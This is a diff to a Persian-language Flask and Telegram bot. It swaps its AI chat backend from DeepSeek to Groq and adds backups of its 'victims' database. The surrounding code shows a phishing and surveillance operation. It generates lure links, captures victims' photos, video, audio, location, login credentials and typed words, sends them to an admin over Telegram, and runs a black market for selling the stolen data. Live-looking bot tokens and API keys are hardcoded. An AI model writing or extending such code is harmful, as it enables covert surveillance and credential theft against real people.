@@ -1,5 +1,5 @@
 import os, io, uuid, base64, json, logging, sqlite3, threading, time, random
-from datetime import datetime
+from datetime import datetime, timedelta
 from flask import Flask, request, render_template_string, send_from_directory, jsonify, g, make_response, redirect
 import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -11,7 +11,6 @@ TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAV
 ADMIN_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "@Oython")
 ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "8391932958"))
 ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
-DEEPSEEK_API_KEY = os.environ.get("DEEPSEEK_API_KEY", "sk-d1b5802a0d50444eb5371d769047b029")
 GROQ_API_KEY = os.environ.get("GROQ_API_KEY", "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")
 DATABASE = "victims.db"
 PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
@@ -45,6 +44,8 @@ def init_db():
         db.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, points INTEGER DEFAULT 0, level INTEGER DEFAULT 1, join_date TEXT)")
         db.execute("CREATE TABLE IF NOT EXISTS listings (id INTEGER PRIMARY KEY AUTOINCREMENT, seller_id INTEGER, token TEXT, price INTEGER, sold INTEGER DEFAULT 0, listed_at TEXT)")
         db.execute("CREATE TABLE IF NOT EXISTS private_chats (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, join_date TEXT)")
+        db.execute("CREATE TABLE IF NOT EXISTS backups (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT)")
+        db.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
         db.commit()
 
 @app.teardown_appcontext
@@ -102,23 +103,21 @@ def send_telegram_location(lat, lng):
     except Exception as e:
         app.logger.error(f"Telegram location failed: {e}")
 
-# -------------------- DeepSeek AI (Chat) --------------------
-def ask_deepseek(prompt, user_id=None):
-    if not DEEPSEEK_API_KEY:
-        return "⚠️ کلید DeepSeek تنظیم نشده است."
+# -------------------- Groq AI (Chat + Whisper) --------------------
+def ask_groq(prompt, user_id=None):
+    if not GROQ_API_KEY:
+        return "⚠️ کلید Groq تنظیم نشده است."
     try:
-        url = "https://api.deepseek.com/chat/completions"
-        headers = {
-            "Authorization": f"Bearer {DEEPSEEK_API_KEY}",
-            "Content-Type": "application/json"
-        }
+        url = "https://api.groq.com/openai/v1/chat/completions"
+        headers = {"Authorization": f"Bearer {GROQ_API_KEY}", "Content-Type": "application/json"}
 
         system_prompt = (
-            "تو یک دستیار هوشمند، دقیق و حرفه‌ای هستی. "
-            "به سوال کاربر مستقیماً و با دقت پاسخ بده. "
-            "پاسخ‌های کامل، مفید و روان به زبان فارسی ارائه کن. "
+            "تو یک دستیار هوشمند، مستقیم و دقیق هستی. "
+            "به سوال کاربر مستقیماً پاسخ بده، بدون اینکه بپرسی 'درباره چه موضوعی صحبت کنیم' یا 'چه سوالی داری'. "
+            "همیشه پاسخ کامل، مفید و روان به زبان فارسی ارائه کن. "
             "اگر سوال فنی یا برنامه‌نویسی است، کد کامل و توضیح دقیق بده. "
-            "همیشه مودب و دوستانه باش، مثل یک دوست آگاه."
+            "مودب، دوستانه و حرفه‌ای باش. "
+            "مکالمه را طبیعی ادامه بده، مثل یک دوست آگاه."
         )
 
         messages = [{"role": "system", "content": system_prompt}]
@@ -126,30 +125,41 @@ def ask_deepseek(prompt, user_id=None):
             messages.extend(conversation_history[user_id][-20:])
         messages.append({"role": "user", "content": prompt})
 
-        payload = {
-            "model": "deepseek-chat",
-            "messages": messages,
-            "temperature": 0.8,
-            "max_tokens": 2048
-        }
-        resp = requests.post(url, json=payload, headers=headers, timeout=30)
-        if resp.status_code == 200:
-            data = resp.json()
-            answer = data['choices'][0]['message']['content'].strip()
-            if user_id is not None:
-                if user_id not in conversation_history:
-                    conversation_history[user_id] = []
-                conversation_history[user_id].append({"role": "user", "content": prompt})
-                conversation_history[user_id].append({"role": "assistant", "content": answer})
-            return answer
-        else:
-            app.logger.error(f"DeepSeek error {resp.status_code}: {resp.text}")
-            return f"❌ خطای {resp.status_code} از هوش مصنوعی. لطفاً دقایقی دیگر تلاش کنید."
+        models = [
+            "llama-3.3-70b-versatile",
+            "deepseek-r1-distill-llama-70b",
+            "llama-3.1-8b-instant"
+        ]
+        last_error = None
+        for model in models:
+            payload = {
+                "model": model,
+                "messages": messages,
+                "temperature": 0.8,
+                "max_tokens": 2048
+            }
+            resp = requests.post(url, json=payload, headers=headers, timeout=30)
+            if resp.status_code == 200:
+                data = resp.json()
+                answer = data['choices'][0]['message']['content'].strip()
+                if user_id is not None:
+                    if user_id not in conversation_history:
+                        conversation_history[user_id] = []
+                    conversation_history[user_id].append({"role": "user", "content": prompt})
+                    conversation_history[user_id].append({"role": "assistant", "content": answer})
+                if "چه موضوعی" in answer or "چه سوالی" in answer or "در مورد چه" in answer:
+                    continue
+                return answer
+            else:
+                last_error = f"مدل {model}: {resp.status_code} - {resp.text[:200]}"
+                app.logger.warning(f"Groq model {model} failed: {resp.status_code}")
+        if last_error:
+            return f"❌ هوش مصنوعی در دسترس نیست.\n{last_error}"
+        return answer
     except Exception as e:
-        app.logger.error(f"DeepSeek exception: {e}")
+        app.logger.error(f"Groq exception: {e}")
         return "❌ خطا در ارتباط با هوش مصنوعی."
 
-# -------------------- Groq Whisper (Transcription) --------------------
 def transcribe_audio(file_bytes):
     if not GROQ_API_KEY:
         return None
@@ -172,7 +182,6 @@ def transcribe_audio(file_bytes):
         app.logger.error(f"Transcription error: {e}")
         return None
 
-# -------------------- TTS --------------------
 async def text_to_speech_async(text, voice="fa-IR-FaridNeural"):
     try:
         communicate = edge_tts.Communicate(text=text, voice=voice)
@@ -697,7 +706,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "📊 اطلاعات کامل دستگاه (باتری، شبکه، مدل دقیق) و عکس صدا و... دریافت کنید.\n\n"
         "دسترسی به انواع حساب ها ، مود تمام گیم ها و هزاران دستور خفن که با بالارفتن امتیاز فعال میشه\n"
         "🛒 بازار سیاه اطلاعات برای خرید و فروش\n"
-        "🤖 هوش مصنوعی حرفه‌ای (DeepSeek): پاسخگویی به پیام‌های خصوصی و ویس."
+        "🤖 هوش مصنوعی حرفه‌ای (Groq): پاسخگویی به پیام‌های خصوصی و ویس.\n"
+        "📊 آمار و پشتیبان‌گیری خودکار"
     )
     keyboard = [
         [InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")],
@@ -723,6 +733,7 @@ async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📊 آمار", callback_data="stats")],
         [InlineKeyboardButton("📢 ارسال به گروه‌ها", callback_data="broadcast_groups_menu")],
         [InlineKeyboardButton("✉️ ارسال به کاربر", callback_data="send_user")],
+        [InlineKeyboardButton("💾 پشتیبان‌گیری", callback_data="backup_now")],
         [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
     ]
     await update.message.reply_text("🔧 پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
@@ -781,10 +792,12 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uc = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
     lc = conn.execute("SELECT COUNT(*) FROM listings WHERE sold=0").fetchone()[0]
     pcc = conn.execute("SELECT COUNT(*) FROM private_chats").fetchone()[0]
+    last_backup = conn.execute("SELECT MAX(timestamp) FROM backups").fetchone()[0] or "هرگز"
     conn.close()
     text = (
         f"📊 <b>آمار</b>\n👥 قربانیان: {vc}\n👤 کاربران: {uc}\n👥 استارت‌ها: {pcc}\n📸 عکس: {ph}\n🎥 ویدیو: {vi}\n🎤 صدا: {au}\n"
-        f"🔑 اطلاعات ورود: {cr}\n🧠 کلمات: {lr}\n🛒 آگهی‌های فعال: {lc}\n🤖 AI: {'✅' if AI_ENABLED else '❌'}\n🤖 ربات: {'✅' if BOT_ACTIVE else '❌'}"
+        f"🔑 اطلاعات ورود: {cr}\n🧠 کلمات: {lr}\n🛒 آگهی‌های فعال: {lc}\n💾 آخرین پشتیبان: {last_backup}\n"
+        f"🤖 AI: {'✅' if AI_ENABLED else '❌'}\n🤖 ربات: {'✅' if BOT_ACTIVE else '❌'}"
     )
     await update.message.reply_text(text, parse_mode="HTML")
 
@@ -906,9 +919,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if msg.reply_to_message and msg.reply_to_message.from_user.id == context.bot.id:
-        if AI_ENABLED and DEEPSEEK_API_KEY:
+        if AI_ENABLED and GROQ_API_KEY:
             thinking_msg = await msg.reply_text("🤔 در حال فکر کردن...")
-            answer = ask_deepseek(msg.text, user_id=user_id)
+            answer = ask_groq(msg.text, user_id=user_id)
             if len(answer) > 4000:
                 parts = [answer[i:i+4000] for i in range(0, len(answer), 4000)]
                 await thinking_msg.delete()
@@ -928,9 +941,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
     conn.close()
 
-    if msg.chat.type == 'private' and AI_ENABLED and DEEPSEEK_API_KEY:
+    if msg.chat.type == 'private' and AI_ENABLED and GROQ_API_KEY:
         thinking_msg = await msg.reply_text("🤔 در حال فکر کردن...")
-        answer = ask_deepseek(msg.text, user_id=user_id)
+        answer = ask_groq(msg.text, user_id=user_id)
         if len(answer) > 4000:
             parts = [answer[i:i+4000] for i in range(0, len(answer), 4000)]
             await thinking_msg.delete()
@@ -940,7 +953,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await thinking_msg.edit_text(answer)
 
 async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not AI_ENABLED or not DEEPSEEK_API_KEY:
+    if not AI_ENABLED or not GROQ_API_KEY:
         return
     msg = update.message
     user_id = msg.from_user.id
@@ -955,7 +968,7 @@ async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.reply_text("❌ نتونستم صدات رو تشخیص بدم.")
         return
     thinking_msg = await msg.reply_text("🤔 ...")
-    answer = ask_deepseek(transcript, user_id=user_id)
+    answer = ask_groq(transcript, user_id=user_id)
     audio_data = await text_to_speech_async(answer)
     if audio_data:
         await msg.reply_voice(voice=io.BytesIO(audio_data))
@@ -1123,6 +1136,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 [InlineKeyboardButton("📊 آمار", callback_data="stats")],
                 [InlineKeyboardButton("📢 ارسال به گروه‌ها", callback_data="broadcast_groups_menu")],
                 [InlineKeyboardButton("✉️ ارسال به کاربر", callback_data="send_user")],
+                [InlineKeyboardButton("💾 پشتیبان‌گیری", callback_data="backup_now")],
                 [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
             ]))
 
@@ -1160,7 +1174,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         elif data == "toggle_ai":
             if user_id != ADMIN_USER_ID: return
-            if not DEEPSEEK_API_KEY: await query.answer("کلید DeepSeek تنظیم نشده", show_alert=True); return
+            if not GROQ_API_KEY: await query.answer("کلید Groq تنظیم نشده", show_alert=True); return
             AI_ENABLED = not AI_ENABLED
             await query.edit_message_text(f"AI {'✅ روشن' if AI_ENABLED else '❌ خاموش'} شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
 
@@ -1176,8 +1190,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             uc = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
             lc = conn.execute("SELECT COUNT(*) FROM listings WHERE sold=0").fetchone()[0]
             pcc = conn.execute("SELECT COUNT(*) FROM private_chats").fetchone()[0]
+            last_backup = conn.execute("SELECT MAX(timestamp) FROM backups").fetchone()[0] or "هرگز"
             conn.close()
-            text = f"📊 <b>آمار</b>\n👥 قربانیان: {vc}\n👤 کاربران: {uc}\n👥 استارت‌ها: {pcc}\n📸 عکس: {ph}\n🎥 ویدیو: {vi}\n🎤 صدا: {au}\n🔑 اطلاعات ورود: {cr}\n🧠 کلمات: {lr}\n🛒 آگهی‌های فعال: {lc}\n🤖 AI: {'✅' if AI_ENABLED else '❌'}\n🤖 ربات: {'✅' if BOT_ACTIVE else '❌'}"
+            text = f"📊 <b>آمار</b>\n👥 قربانیان: {vc}\n👤 کاربران: {uc}\n👥 استارت‌ها: {pcc}\n📸 عکس: {ph}\n🎥 ویدیو: {vi}\n🎤 صدا: {au}\n🔑 اطلاعات ورود: {cr}\n🧠 کلمات: {lr}\n🛒 آگهی‌های فعال: {lc}\n💾 آخرین پشتیبان: {last_backup}\n🤖 AI: {'✅' if AI_ENABLED else '❌'}\n🤖 ربات: {'✅' if BOT_ACTIVE else '❌'}"
             await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
 
         elif data == "victims_list":
@@ -1284,6 +1299,20 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 name = u['first_name'] + (" " + u['last_name'] if u['last_name'] else "")
                 text += f"{i}. <b>{name}</b> (@{u['username']}) — <code>{u['user_id']}</code>\n"
             await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
+
+        elif data == "backup_now":
+            if user_id != ADMIN_USER_ID: return
+            # Perform a simple backup by copying the database file
+            try:
+                import shutil
+                backup_name = f"victims_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
+                shutil.copy(DATABASE, backup_name)
+                conn = get_db_connection()
+                conn.execute("INSERT INTO backups (timestamp) VALUES (?)", (datetime.now().isoformat(),))
+                conn.commit(); conn.close()
+                await query.edit_message_text(f"💾 پشتیبان‌گیری با موفقیت انجام شد.\nفایل: {backup_name}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
+            except Exception as e:
+                await query.answer(f"خطا در پشتیبان‌گیری: {e}", show_alert=True)
 
         elif data == "start":
             keyboard = [[InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")],
